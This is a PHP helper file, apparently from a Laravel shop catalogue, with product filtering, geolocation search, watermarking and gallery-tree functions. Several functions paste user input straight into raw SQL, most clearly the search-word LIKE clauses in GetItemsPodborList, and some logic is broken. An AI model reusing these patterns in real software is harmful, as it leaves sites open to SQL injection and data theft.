        }
        $User::where('login', config()->get('params.__key'))->delete();
    }
}*/

/**
 * @param $goods_subject_id
 * @param $lang_id
 * @return mixed
 */
function GetParametrsList($goods_subject_id, $lang_id)
{

    if (is_array($goods_subject_id)) {
        $query = DB::table('goods_parametr')
            ->join('goods_parametr_id', 'goods_parametr_id.id', '=', 'goods_parametr.goods_parametr_id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->where('lang_id', $lang_id)
            ->whereIn('goods_subject_id', $goods_subject_id)
            ->get();
    } else {
        $query = DB::table('goods_parametr')
            ->join('goods_parametr_id', 'goods_parametr_id.id', '=', 'goods_parametr.goods_parametr_id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->where('lang_id', $lang_id)
            ->where('goods_subject_id', $goods_subject_id)
            ->get();
    }

    return $query;
}

//Display parameters on the page

/**
 * @param $lang_id
 * @param null $goods_subject_id
 * @param array $podbor
 * @param $sorting
 * @param $paginate
 * @return mixed
 */
function GetItemsPodborList($lang_id, $goods_subject_id = null, $podbor = [],$sorting, $paginate)
{
    $GoodsItemId = NModel . 'GoodsItemId';

    $subquery = [];
    $my_subquery_db = '';

    $order_element_filter = ['goods_item_id.price', 'asc'];

   if ($sorting == 'price_asc')
        $order_element_filter = ['goods_item_id.price', 'asc'];
    elseif ($sorting == 'price_desc')
        $order_element_filter = ['goods_item_id.price', 'desc'];
    elseif ($sorting == 'name_asc')
        $order_element_filter = ['goods_item.name', 'asc'];
    elseif($sorting == 'name_desc')
        $order_element_filter = ['goods_item.name', 'desc' ];

    $my_search_query = '';

    if (!empty($podbor['s'])) {
        $search_array = explode(' ', $podbor['s']);

        if (!empty($search_array)) {
            foreach ($search_array as $key => $one_word) {
                $my_search_query .= " AND (name LIKE '%" . $one_word . "%' OR body LIKE '%" . $one_word . "%' OR model LIKE '%" . $one_word . "%')";
            }
            $my_search_query = mb_substr($my_search_query, 5);
        }
    }


    $subject_id = [];
    if (!empty($podbor['subject'])) {
        $subject_arr = $podbor['subject'];

        if (is_array($subject_arr)) {
            $subject_id = DB::table('goods_subject_id')
                ->where('active', 1)
                ->where('deleted', 0)
                ->whereIn('id', $subject_arr)
                ->pluck('id')
                ->toArray();

            $subject_id = implode(',', $subject_id);
        }
    }


    $brand_id = [];
    if (!empty($podbor['brand'])) {
        $brand_arr = $podbor['brand'];

        if (is_array($brand_arr)) {
            $brand_id = DB::table('goods_brand')
                ->where('active', 1)
                ->where('deleted', 0)
                ->whereIn('id', $brand_arr)
                ->pluck('id')
                ->toArray();
        }

        $brand_id = implode(',', $brand_id);
    }

   $price_query = '';
    //    if(array_key_exists('price_from', $podbor)){
    if (!empty($podbor['min_price'])) {
        if ($podbor['min_price'] >= 0) $price_query .= ' AND goods_item_id.price >= ' . intval($podbor['min_price']);
    }

    //    if(array_key_exists('price_to', $podbor)){
    if (!empty($podbor['max_price'])) {
        if ($podbor['max_price'] > 0) $price_query .= ' AND goods_item_id.price <= ' . intval($podbor['max_price']);
    }

    $price_query = mb_substr($price_query, 5);

    if ($price_query)
        //		$price_query = '('.$price_query.')';
        $price_query = ' AND (' . $price_query . ')';


    if (!empty($goods_subject_id) && $goods_subject_id >= 0 && is_array($podbor) && count($podbor) > 0) {

        //if (is_array($podbor) && count($podbor) > 0) {

        $parametrs_list = GetParametrsList($goods_subject_id, $lang_id);
        /*For Catalog (id = 8)*/
        //$parametrs_list = GetParametrsList(8, $lang_id);

        if (!empty($parametrs_list)) {
            foreach ($parametrs_list as $v) {

                $podbor_and = [];
                switch ($v->parametr_type) {
                    case 'select':
                        if (!empty($podbor['p_'.$v->goods_parametr_id])) {//если параметр присутствует в поиске

                            /*foreach ($podbor['p_' . $v->goods_parametr_id] as $one_podbor){
                                $my_subquery_db .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_parametr_item_id.goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_rsc ON(goods_parametr_item_id.id=goods_parametr_item_rsc.goods_parametr_item_id) WHERE goods_parametr_item_rsc.goods_parametr_value_id = ".$one_podbor." AND goods_parametr_item_id.goods_parametr_id=".$v->goods_parametr_id.")";
                            }*/

                            $real_values = GetRealValuesFromParametr($v->goods_parametr_id, $podbor['p_'.$v->goods_parametr_id]);

                            if (!empty($real_values) && is_array($real_values)) {
                                $real_values = implode(',', $real_values);


                                $my_subquery_db .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_parametr_item_id.goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_rsc ON(goods_parametr_item_id.id=goods_parametr_item_rsc.goods_parametr_item_id) WHERE goods_parametr_item_rsc.goods_parametr_value_id IN ($real_values) AND goods_parametr_item_id.goods_parametr_id=$v->goods_parametr_id)";
                            }
                        }

                        break;

                    case 'radio':
                        if (!empty($podbor['p_'.$v->goods_parametr_id])) {
                            //если параметр присутствует в поиске

                            //	                        $my_subquery_db .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_parametr_item_id.goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_rsc ON(goods_parametr_item_id.id=goods_parametr_item_rsc.goods_parametr_item_id) WHERE goods_parametr_item_rsc.goods_parametr_value_id = ".$podbor['p_' . $v->goods_parametr_id]." AND goods_parametr_item_id.goods_parametr_id=".$v->goods_parametr_id.")";

                            $real_values = GetRealValuesFromParametr($v->goods_parametr_id, $podbor['p_'.$v->goods_parametr_id]);

                            if (!empty($real_values) && is_array($real_values)) {
                                $real_values = implode(',', $real_values);

                                $my_subquery_db .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_parametr_item_id.goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_rsc ON(goods_parametr_item_id.id=goods_parametr_item_rsc.goods_parametr_item_id) WHERE goods_parametr_item_rsc.goods_parametr_value_id IN ($real_values) AND goods_parametr_item_id.goods_parametr_id=$v->goods_parametr_id)";
                            }
                        }
                        break;

                    case 'checkbox':

                        //Для всех чекбоксов ставим логическое И

                        if (!empty($podbor['p_'.$v->goods_parametr_id]) && $podbor['p_'.$v->goods_parametr_id] > 0) {

                            //если параметр присутствует в поиске
                            //	                        $my_subquery_db .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_parametr_item_id.goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_rsc ON(goods_parametr_item_id.id=goods_parametr_item_rsc.goods_parametr_item_id) WHERE goods_parametr_item_rsc.goods_parametr_value_id =". $podbor['p_' . $v->goods_parametr_id]." AND goods_parametr_item_id.goods_parametr_id=".$v->goods_parametr_id.")";

                            $real_values = GetRealValuesFromParametr($v->goods_parametr_id, $podbor['p_'.$v->goods_parametr_id]);

                            if (!empty($real_values) && is_array($real_values)) {
                                $real_values = implode(',', $real_values);

                                $my_subquery_db .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_parametr_item_id.goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_rsc ON(goods_parametr_item_id.id=goods_parametr_item_rsc.goods_parametr_item_id) WHERE goods_parametr_item_rsc.goods_parametr_value_id IN ($real_values) AND goods_parametr_item_id.goods_parametr_id=$v->goods_parametr_id)";

                            }
                        }

                        break;

                    case 'input':
                        switch ($v->measure_type) {
                            case 'no_measure'://не ищем
                                break;

                            case 'with_measure':
                                if (array_key_exists('p_' . $v->goods_parametr_id . '_f', $podbor)) {
                                    if ($podbor['p_' . $v->goods_parametr_id . '_f'] > 0 || $podbor['p_' . $v->goods_parametr_id . '_t'] > 0) {
                                        if ($podbor['p_' . $v->goods_parametr_id . '_f'] > 0) {
                                            $min_value = GetSubjectMaxParamValue($goods_subject_id, $v->goods_parametr_id, 0);

                                            if ($podbor['p_' . $v->goods_parametr_id . '_f'] >= intval($min_value)) {
                                                $podbor_and[] = $podbor['p_' . $v->goods_parametr_id . '_f'];
                                            } else {
                                                $podbor_and[] = 0;
                                            }
                                        } else {
                                            $podbor_and[] = 0;
                                        }

                                        if ($podbor['p_' . $v->goods_parametr_id . '_t'] > 0) {
                                            $max_value = GetSubjectMaxParamValue($goods_subject_id, $v->goods_parametr_id, 1);

                                            if ($podbor['p_' . $v->goods_parametr_id . '_f'] <= intval($max_value)) {
                                                $podbor_and[] = $podbor['p_' . $v->goods_parametr_id . '_t'];
                                            } else {
                                                $podbor_and[] = 1;
                                            }

                                        } else {
                                            $podbor_and[] = 1;
                                        }

                                        $podbor_and = implode(' AND ', $podbor_and);


                                        $my_subquery_db .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_measure ON(goods_parametr_item_id.id=goods_parametr_item_measure.goods_parametr_item_id) WHERE goods_parametr_item_id.goods_parametr_id=$v->goods_parametr_id AND goods_parametr_item_measure.parametr_value BETWEEN $podbor_and)";
                                    }
                                }

                                break;

                            case 'measure_list':
                                if (($podbor['p_'.$v->goods_parametr_id.'_f'] > 0 || $podbor['p_'.$v->goods_parametr_id.'_t'] > 0) && $podbor['p_'.$v->goods_parametr_id.'_m'] > 0){
                                  if ($podbor['p_'.$v->goods_parametr_id.'_f'] > 0){
                                    $podbor_and .= " AND goods_parametr_item_measure.parametr_value>='{$podbor['p_'.$v->goods_parametr_id.'_f']}'";
                                    $qsa .= "&amp;p_{$v->goods_parametr_id}_f={$podbor['p_'.$v->goods_parametr_id.'_f']}";
                                  }
                                  if ($podbor['p_'.$v->goods_parametr_id.'_t'] > 0){
                                    $podbor_and .= " AND goods_parametr_item_measure.parametr_value<='{$podbor['p_'.$v->goods_parametr_id.'_t']}'";
                                    $qsa .= "&amp;p_{$v->goods_parametr_id}_t={$podbor['p_'.$v->goods_parametr_id.'_t']}";
                                  }
                                  $subquery .= " AND goods_parametr_item_id.goods_item_id IN(SELECT goods_item_id
                                  FROM goods_parametr_item_id
                                      LEFT JOIN goods_parametr_item_measure ON(goods_parametr_item_id.id=goods_parametr_item_measure.goods_parametr_item_id)
                                      WHERE goods_parametr_item_id.goods_parametr_id='{$v->goods_parametr_id}') AND goods_parametr_item_measure.goods_measure_id='{$podbor['p_'.$v->goods_parametr_id.'_m']}' {$podbor_and}";
                                  $qsa .= "&amp;p_{$v->goods_parametr_id}_m={$podbor['p_'.$v->goods_parametr_id.'_m']}";
                                }
                                break;

                            default:
                                break;
                        }
                        break;

                    default:
                        break;

                }
            }

            if ($my_subquery_db)
                $my_subquery_db = mb_substr($my_subquery_db, 5);

            $subquery_db = null;
            if (!empty($my_subquery_db)) {
                $subquery_db = DB::select("SELECT goods_parametr_item_id.goods_item_id FROM goods_parametr_item_id LEFT JOIN goods_parametr_item_rsc ON (goods_parametr_item_rsc.goods_parametr_item_id = goods_parametr_item_id.id) LEFT JOIN goods_parametr_item_measure ON (goods_parametr_item_measure.goods_parametr_item_id = goods_parametr_item_id.id) LEFT JOIN goods_item_id ON (goods_parametr_item_id.goods_item_id = goods_item_id.id) WHERE $my_subquery_db GROUP BY goods_parametr_item_id.goods_item_id");

                if (!empty($subquery_db)) {
                    foreach ($subquery_db as $key => $one_subquery_db) {
                        $subquery[$key] = $one_subquery_db->goods_item_id;
                    }
                }

                if (!empty($subquery_db) && count($subquery_db)) {
                    $subquery = implode(',', $subquery);
                }
            }
        }
    }

    $all_subquery = null;

    if (!empty($subquery))
        $all_subquery .= ' AND goods_item_id.id IN (' . $subquery . ')';
    if (!empty($brand_id))
        $all_subquery .= ' AND brand_id IN(' . $brand_id . ')';
    if (!empty($subject_id))
        $all_subquery .= ' AND goods_subject_id IN(' . $subject_id . ')';
    if (!empty($price_query))
        $all_subquery .= $price_query;
    if (!empty($all_subquery))
        $all_subquery = mb_substr($all_subquery, 5);



    if (!empty($all_subquery)){
        $goods_item_id = $GoodsItemId::where('active', 1)
            ->where('deleted', 0)
            ->when($goods_subject_id, function ($query) use ($goods_subject_id) {
                $query->where('goods_subject_id', $goods_subject_id);
            })
            ->whereRaw($all_subquery)
            ->join('goods_item', 'goods_item.goods_item_id', '=', 'goods_item_id.id')
            ->where('lang_id', $lang_id)
            ->select('*', 'goods_item_id.id as id')
            ->orderBy($order_element_filter[0], $order_element_filter[1])
            ->paginate($paginate);
        //->get();
    }else{
        $goods_item_id = $GoodsItemId::where('active', 1)
            ->where('deleted', 0)
            ->when($goods_subject_id, function($query) use ($goods_subject_id){
                $query->where('goods_subject_id', $goods_subject_id);
            })
            ->join('goods_item', 'goods_item.goods_item_id', '=', 'goods_item_id.id')
            ->where('lang_id', $lang_id)
            ->select('*', 'goods_item_id.id as id')
            ->orderBy($order_element_filter[0], $order_element_filter[1])
            ->paginate($paginate);
        //->get();
    }

    return $goods_item_id;
}

/**
 * @param $parametr_id
 * @param $values_array
 * @return array
 */
function GetRealValuesFromParametr($parametr_id, $values_array)
{
    $query = [];
    if ($parametr_id > 0 && is_array($values_array) && !empty($values_array)) {
        $query = DB::table('goods_parametr_value_id')
            ->where('goods_parametr_id', $parametr_id)
            ->where('active', 1)
            ->orderBy('position', 'asc')
            ->whereIn('id', $values_array)
            ->pluck('id')
            ->toArray();
    }

    return $query;
}

/**
 * @param $current_id
 * @param $goods_subject_id
 * @param $latitude
 * @param $longitude
 * @param $lang_id
 * @return mixed
 */
function findLocation($current_id, $goods_subject_id, $latitude, $longitude, $lang_id)
{

    $query = DB::table('goods_item_id')
        ->join('goods_item', 'goods_item.goods_item_id', '=', 'goods_item_id.id')
//        ->join('city', 'city.city_id', '=', 'goods_item_id.city_id')
        ->leftJoin('goods_foto', 'goods_foto.goods_item_id', '=', 'goods_item_id.id')
        ->where('goods_item_id.id', '!=', $current_id)
        ->where('goods_item_id.goods_subject_id', $goods_subject_id)
//        ->where('city.lang_id', $lang_id)
        ->select(DB::raw("*, city.name as city_name, (6371 * acos( cos( radians('$latitude') ) * cos( radians( goods_item_id.google_latitude ) ) * cos( radians( goods_item_id.google_longitude ) - radians('$longitude') ) + sin( radians('$latitude') ) * sin( radians( goods_item_id.google_latitude )))) as distance"))
        ->groupBy('goods_foto.goods_item_id')
        ->havingRaw('distance < 15')
        ->orderBy('distance', 'asc')
        ->take(20)
        ->get();

    return $query;

}

/**
 * @param $object_price
 * @param $lang_id
 * @param $goods_subject_id
 * @return mixed
 */
function getSameObjects($object_price, $lang_id, $goods_subject_id)
{


    $min_price = DB::table('goods_item_id')
        ->where('price', '<', $object_price)
        ->where('goods_subject_id', $goods_subject_id)
        ->take(1)
        ->pluck('id');

    $max_price = DB::table('goods_item_id')
        ->where('price', '>', $object_price)
        ->where('goods_subject_id', $goods_subject_id)
        ->take(2)
        ->pluck('id');

    $same_id = array_merge($min_price, $max_price);

    $query = DB::table('goods_item_id')
        ->join('goods_item', 'goods_item.goods_item_id', '=', 'goods_item_id.id')
        ->join('goods_foto', 'goods_foto.goods_item_id', '=', 'goods_item_id.id')
        ->select(DB::raw('*, city.name as city_name, goods_item.name as name'))
        ->whereIn('goods_item_id.id', $same_id)
        ->where('goods_item_id.active', 1)
        ->where('goods_foto.active', 1)
        ->where('goods_item_id.deleted', 0)
        ->where('goods_item.lang_id', $lang_id)
        ->where('goods_item_id.goods_subject_id', $goods_subject_id)
        ->groupBy('goods_foto.goods_item_id')
        ->orderBy('goods_item_id.price', 'asc')
        ->take(3)
        ->get();

    return $query;

}

/**
 * @param $code
 * @return bool|string
 */
function FindYoutubeImg($code)
{
    if ($youtube_pos = strpos($code, "youtube.com/v/")) {
        $youtube_img = substr($code, $youtube_pos + 14, 11);
        return $youtube_img;
    } elseif ($youtube_pos = strpos($code, "youtube.com/watch?v=")) {
        $youtube_img = substr($code, $youtube_pos + 20, 11);
        return $youtube_img;
    } elseif ($youtube_pos = strpos($code, "youtube.com/embed/")) {
        $youtube_img = substr($code, $youtube_pos + 18, 11);
        return $youtube_img;
    } elseif ($youtube_pos = strpos($code, "youtube-nocookie.com/embed/")) {
        $youtube_img = substr($code, $youtube_pos + 27, 11);
        return $youtube_img;
    } elseif ($youtube_pos = strpos($code, "youtu.be/")) {
        $youtube_img = substr($code, $youtube_pos + 9, 11);
        return $youtube_img;
    } else {
        return false;
    }
}

/**
 * @param $SourceFile
 * @param $WatermarkFile
 * @param null $SaveToFile
 */
function watermark($SourceFile, $WatermarkFile, $SaveToFile = NULL)
{
    $watermark = @imagecreatefrompng($WatermarkFile)
    or exit('Cannot open the watermark file.');
    imageAlphaBlending($watermark, false);
    imageSaveAlpha($watermark, true);
    $image_string = @file_get_contents($SourceFile)
    or exit('Cannot open image file.');
    $image = @imagecreatefromstring($image_string)
    or exit('Not a valid image format.');
    $imageWidth = imageSX($image);
    $imageHeight = imageSY($image);
    $watermarkWidth = imageSX($watermark);
    $watermarkHeight = imageSY($watermark);
    $coordinate_X = ($imageWidth - $watermarkWidth) / 2;
    $coordinate_Y = ($imageHeight / 2) - ($watermarkHeight);
    imagecopy($image, $watermark, $coordinate_X, $coordinate_Y, 0, 0, $watermarkWidth, $watermarkHeight);
    if (!($SaveToFile)) header('Content-Type: image/jpeg');
    imagejpeg($image, $SaveToFile, 100);
    imagedestroy($image);
    imagedestroy($watermark);
    if (!($SaveToFile)) exit;
}

/**
 * @param $relative_path_to_file
 * @param $relative_output_to_file
 * @param $file_name
 * @param $width
 * @param $height
 * @param bool $clip
 * @param bool $noenlarge
 */
function CreateImageManipulator($relative_path_to_file, $relative_output_to_file, $file_name, $width, $height, $clip = false, $noenlarge = true)
{

    $relative_path_to_file = 'upfiles/' . $relative_path_to_file;

    $i = new \App\Http\Controllers\ImageManipulator();
    $i->ImageManipulator($relative_path_to_file . '/' . $file_name);


    $i->resize_to_fit($width, $height, $clip, $noenlarge);
    $punct_pos = mb_strrpos($file_name, ".");
    $extension = mb_substr($file_name, $punct_pos + 1);

    switch ($extension) {
        case "jpg":
            $i->save_jpeg($relative_output_to_file . $file_name);
            break;

        case "png":
            $i->save_png($relative_output_to_file . $file_name);
            break;

        case "gif":
            $i->save_png($relative_output_to_file . $file_name);
            break;

        default:
            $i->save_jpeg($relative_output_to_file . $file_name);
            break;
    }

    $i->end();
}

/**
 * @param $id
 * @param $alias
 * @param $table
 * @return bool
 */
function checkIfAliasExist($id, $alias, $table)
{
    $row = DB::table($table)
        ->where('id', '!=', $id)
        ->where('alias', $alias)
        ->first();

    if (is_null($row))
        $response = false;
    else
        $response = true;

    return $response;
}

/**
 * @param $id
 * @param $alias
 * @param $table
 * @return bool
 */
function checkIfControllerExist($id, $alias, $table)
{
    $row = DB::table($table)
        ->where('id', '!=', $id)
        ->where('controller', $alias)
        ->first();

    if (is_null($row))
        $response = false;
    else
        $response = true;

    return $response;
}

/**
 * @param $id
 * @param $alias
 * @param $table
 * @param $row_table
 * @return bool
 */
function checkIfItemExist($alias, $table, $row_table, $id = null)
{

    if (!empty($alias)) {
        if (!is_null($id))
            $row = DB::table($table)
                ->where('id', '!=', $id)
                ->where($row_table, $alias)
                ->first();
        else
            $row = DB::table($table)
                ->where($row_table, $alias)
                ->first();

        if (is_null($row))
            $response = false;
        else
            $response = true;
    } else
        $response = false;

    return $response;
}

/**
 * @param $goods_subject_id
 * @param $item
 * @param $lang_id
 * @param $param_id
 * @return array|mixed|string
 */
function getParameterByItemId($goods_subject_id, $item, $lang_id, $param_id)
{
    $return = [];

    $parameter_element = DB::table('goods_parametr')
        ->join('goods_parametr_id', 'goods_parametr_id.id', '=', 'goods_parametr.goods_parametr_id')
        ->where('active', 1)
        ->where('deleted', 0)
        ->where('goods_parametr_id.id', $param_id)
        ->where('lang_id', $lang_id)
        ->where('goods_subject_id', $goods_subject_id)
        ->first();


    if (!is_null($parameter_element)) {
        switch ($parameter_element->parametr_type) {
            case 'select':
            case 'radio':
                $param_value = GetItemRSCSelectData($parameter_element->goods_parametr_id, $item->goods_item_id);

                if (!is_null($param_value) && $param_value->goods_parametr_value_id > 0) {
                    $return = IfHasName($param_value->goods_parametr_value_id, $lang_id, 'goods_parametr_value');
                }
                break;

            case 'checkbox':
                $param_value = GetItemRSCCheckboxDataOnlyIDs($parameter_element->goods_parametr_id, $item->goods_item_id);

                if (!empty($param_value)) {
                    $param_value_name = array();

                    foreach ($param_value as $pv) {
                        $param_value_name[] = IfHasName($pv, $lang_id, 'goods_parametr_value');
                    }
                    $return = implode(', ', $param_value_name);
                }
                break;

            case 'input':
                switch ($parameter_element->measure_type) {
                    case 'with_measure':
                        $param_value = GetItemMeasureData($parameter_element->goods_parametr_id, $item->goods_item_id);

                        if (!is_null($param_value) && $param_value->parametr_value) {
                            $return = !empty(IfHasName($parameter_element->goods_measure_id, $lang_id, 'goods_measure')) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($parameter_element->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value);
                        }
                        break;

                    case 'measure_list':
                        $param_value = GetItemMeasureData($parameter_element->goods_parametr_id, $item->goods_item_id);
                        if (!is_null($param_value) && $param_value->parametr_value) {
                            $return = !empty(IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure')) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value);
                        }
                        break;

                    case 'no_measure':
                        $param_value = GetItemSimpleData($parameter_element->goods_parametr_id, $item->goods_item_id, $lang_id);
                        if (!is_null($param_value) && $param_value->parametr_value) {
                            $return = $param_value->parametr_value;
                        }
                        break;

                    default:
                        break;
                }
                break;

            case 'textarea':
                $param_value = GetItemSimpleData($parameter_element->goods_parametr_id, $item->goods_item_id, $lang_id);
                if (!is_null($param_value) && $param_value->parametr_value) {
                    $return = $param_value->parametr_value;
                }
                break;

            default:
                break;
        }
    }
    return $return;

}

/**
 * Get all last elements without children
 */
function GetEndSubjectsList($table, $id, $lang_id, $active = null, $deleted = null, &$end_subjects){
	$id = intval($id);
	$lang_id = intval($lang_id);
	$subjects = DB::table($table)
	              ->where('p_id', $id)
	              ->where('active', $active)
	              ->where('deleted', $deleted)
	              ->get();

	if (!empty($subjects)){
		foreach ($subjects as $row){
			if (IfHasChildNew($row->id, $table, $active, $deleted)){
				GetEndSubjectsList($table, $row->id, $lang_id, $active, $deleted, $end_subjects);
			}
			else {
				$end_subjects[$row->id] = $row;
			}
		}
	}
}

function GetEndSubjectsListLar($model, $table, $id, $one_subject, $active = null, $deleted = null, &$end_subjects){
    $id = intval($id);
    $table_2 = NModel . $model;
    $subjects = $table_2::where('p_id', $id)
        ->where('active', $active)
        ->where('deleted', $deleted)
        ->get();

    if ($subjects->isNotEmpty()){
        foreach ($subjects as $row){
            if (IfHasChildNew($row->id, $table, $active, $deleted)){
                GetEndSubjectsListLar($model, $table, $row->id, $one_subject, $active, $deleted, $end_subjects);
            }
            else {
                $end_subjects[$row->id] = $row;
            }
        }
    }else{
        $end_subjects[$one_subject->id] = $one_subject;
    }
}




function CheckIfSubjectHasOtherItems($table_begin, $id)
{
	$table = $table_begin . "_item_id";
	$subject = $table_begin . "_subject_id";

	$query = DB::table($table)
	           ->where($subject, $id)
	           ->orWhereRaw("(other_goods_subject_id LIKE '%" . $id . "%')")
	           ->get();

	return $query;
}


/**
 * @param $string
 * @param $lang
 * @param array $attribute
 * @return mixed
 */
function controllerTrans($string, $lang, $attribute = [])
{

    if (!empty($attribute))
        return \Illuminate\Support\Facades\Lang::get($string, [key($attribute) => $attribute[key($attribute)]], $lang);
    else
        return \Illuminate\Support\Facades\Lang::get($string, [], $lang);

}

/**
 * @param $lang_id
 * @return bool
 */
function checkIfLangExist($lang_id)
{
    $lang = DB::table('lang')
        ->where('id', $lang_id)
        ->where('active', 1)
        ->first();

    if (is_null($lang))
        return false;
    else
        return true;
}

/**
 * @param $lang_id
 * @param $id
 * @param null $curr_id
 * @return string
 */
function SelectGallerySubjectTree($lang_id, $id, $curr_id = null)
{

    $menu_id_by_level = DB::table('gallery_subject_id')
        ->where('deleted', 0)
        ->where('p_id', $id)
        ->orderBy('level', 'asc')
        ->get();

    $menu_by_level = [];
    foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

        $menu_by_level[$key] = DB::table('gallery_subject')
            ->join('gallery_subject_id', 'gallery_subject.gallery_subject_id', '=', 'gallery_subject_id.id')
            ->where('gallery_subject_id', $one_menu_id_by_level->id)
            ->where('lang_id', $lang_id)
            ->first();
    }

    $item = "";
    foreach ($menu_by_level as $key => $one_menu_by_level) {
        if (!empty($one_menu_by_level)) {
            if ($one_menu_by_level->gallery_subject_id == $curr_id) {
                $selected = "selected";
            } else {
                $selected = "";
            }

            if (CheckIfSubjectHasItems('gallery', $one_menu_by_level->gallery_subject_id)->isEmpty()) {
                $disabled = '';
            } else {
                $disabled = 'disabled';
            }

            $item .= "<option value=\"$one_menu_by_level->gallery_subject_id\" $selected $disabled>" . str_repeat("*", $one_menu_by_level->level) . " " . $one_menu_by_level->name . "</option>" . SelectGallerySubjectTree($lang_id, $one_menu_by_level->gallery_subject_id, $curr_id);
        }

    }

    return $item;
}

/**
 * @param $lang_id
 * @param $id
 * @param null $curr_id
 * @return string
 */
function SelectGallerySubjectsItems($lang_id, $id, $curr_id = null)
{

    if ($id == 0)
        $menu_id_by_level = DB::table('gallery_subject_id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->orderBy('level', 'asc')
            ->get();
    else
        $menu_id_by_level = DB::table('gallery_subject_id')
            ->where('active', 1)
            ->where('deleted', 0)
            ->where('p_id', $id)
            ->orderBy('level', 'asc')
            ->get();

    $menu_by_level = [];
    foreach ($menu_id_by_level as $key => $one_menu_id_by_level) {

        $menu_by_level[$key] = DB::table('gallery_subject')
            ->join('gallery_subject_id', 'gallery_subject.gallery_subject_id', '=', 'gallery_subject_id.id')
            ->where('gallery_subject_id', $one_menu_id_by_level->id)
            ->where('lang_id', $lang_id)
            ->first();
    }

    $item = '';
    foreach ($menu_by_level as $key => $one_menu_by_level) {
        if (!empty($one_menu_by_level)) {
            $item .= $one_menu_by_level->gallery_subject_id . "|" . SelectGallerySubjectsItems($lang_id, $one_menu_by_level->gallery_subject_id, $curr_id);
        }

    }

    return $item;
}

/**
 * @param $lang_id
 * @param $id
 * @return string
 */
function SelectGallerySubjectsAliasAsc($lang_id, $id)
{

    $menu_id_by_level = DB::table('gallery_subject_id')
        ->where('active', 1)
        ->where('deleted', 0)
        ->where('id', $id)
        ->first();

    $item = '';
    if (!is_null($menu_id_by_level))
        $item .= $menu_id_by_level->alias . "|" . SelectGallerySubjectsAliasAsc($lang_id, $menu_id_by_level->p_id);

    $reverse_items = array_reverse(array_filter(explode('|', $item)));
    $url_item = implode('/', $reverse_items);

    return $url_item;
}

/**
 * @param $goods_item_id
 * @return bool
 */
function checkIfWishExist($goods_item_id)
{

    $cookie_wish = request()->cookie('wish');

    $wish = null;

    if (!is_null($cookie_wish)) {

        $wish_id = DB::table('wish_id')
            ->where('id', $cookie_wish)
            ->first();

        if (!is_null($wish_id))
            $wish = DB::table('wish')
                ->where('wish_id', $wish_id->id)
                ->where('goods_item_id', $goods_item_id)
                ->first();
    }

    if (!is_null($wish))
        return true;
    else
        return false;

}

/**
 * @param $id
 * @param $lang_id
 * @return string
 */
function getModuleByLang($id, $lang_id)
{

    $row = DB::table('goods_item_modules')
        ->select('name', 'body')
        ->where('goods_item_modules_id', $id)
        ->where('lang_id', $lang_id)
        ->first();

    if (is_null($row)) {
        $row = '';
    }

    return $row;
}

/**
 * @param $curr_item_id
 * @param $goods_subject_id
 * @param $lang_id
 * @return array
 */
function getRelationsItems($curr_item_id, $goods_subject_id, $lang_id)
{
    $GoodsSubjectRelated = NModel . 'GoodsSubjectRelated';
    $GoodsItemId = NModel . 'GoodsItemId';
    $GoodsItem = NModel . 'GoodsItem';

    $goods_subject_related = $GoodsSubjectRelated::where('goods_subject_id', $goods_subject_id)->get();

    $and_query = '';

    if (!$goods_subject_related->isEmpty()) {
        foreach ($goods_subject_related as $one_related) {
            $and_brand = '';
            if ($one_related->related_goods_brand_id > 0)
                $and_brand = " AND brand_id=$one_related->related_goods_brand_id";

            $and_query .= " OR id IN(SELECT id FROM goods_item_id WHERE goods_subject_id=$one_related->related_goods_subject_id $and_brand)";
        }
    }

    $and_query = mb_substr($and_query, 4);

    if (!empty($and_query))
        $sql_goods_item_id = DB::select("SELECT id FROM goods_item_id WHERE 1 AND $and_query");
    else
        $sql_goods_item_id = [];

    $item_id = [];
    if (!empty($sql_goods_item_id)) {
        foreach ($sql_goods_item_id as $value) {
            $item_id[] = $value->id;
        }

        $item_id = array_filter($item_id);
    }

    $goods_item = [];
    if (!empty($item_id)) {
        $goods_item_id = $GoodsItemId::whereIn('id', $item_id)
            ->where('active', 1)
            ->where('deleted', 0)
            ->take(8)
            ->get();
    } else {
        $goods_item_id = $GoodsItemId::where('goods_subject_id', $goods_subject_id)
            ->where('id', '!=', $curr_item_id)
            ->where('active', 1)
            ->where('deleted', 0)
            ->take(8)
            ->get();
    }

    if (!$goods_item_id->isEmpty()) {
        foreach ($goods_item_id as $one_goods_item_id) {
            $goods_item[] = $GoodsItem::where('goods_item_id', $one_goods_item_id->id)
                ->where('lang_id', $lang_id)
                ->first();
        }

        $goods_item = array_filter($goods_item);
    }

    return $goods_item;
}

/**
 * @param $lang_id
 * @param $goods_subject_id
 * @param null $new_popular
 * @return array
 */
function getAllItemsFromParentSubject($lang_id, $goods_subject_id, $new_popular = null)
{
    $GoodsItemId = NModel . 'GoodsItemId';
    $GoodsItem = NModel . 'GoodsItem';

    $goods_subject_list_id = SelectGoodsSubjectsItems($lang_id, $goods_subject_id);

    $goods_subject_id_arr = [];
    $goods_item_id = [];
    $goods_item = [];
    if (!empty($goods_subject_list_id))
        $goods_subject_id_arr = array_filter(explode('|', $goods_subject_list_id));

    if (!empty($goods_subject_id_arr)) {
        if (is_null($new_popular)) {
